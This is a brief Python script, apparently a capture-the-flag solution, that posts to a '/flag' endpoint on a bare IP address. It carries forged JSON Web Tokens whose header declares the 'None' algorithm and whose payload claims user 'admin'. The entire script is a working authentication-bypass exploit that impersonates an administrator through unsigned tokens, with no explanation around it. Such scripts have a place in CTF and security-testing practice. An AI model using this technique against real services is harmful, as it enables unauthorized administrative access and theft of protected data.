import requests

url = "http://34.131.133.224:9999/flag"
headers = {
    "Content-Type": "application/json",
    "Authorization": "Bearer eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.."
}
data = {"token":"eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."}

response = requests.post(url, headers=headers, json=data)
print(response.text)
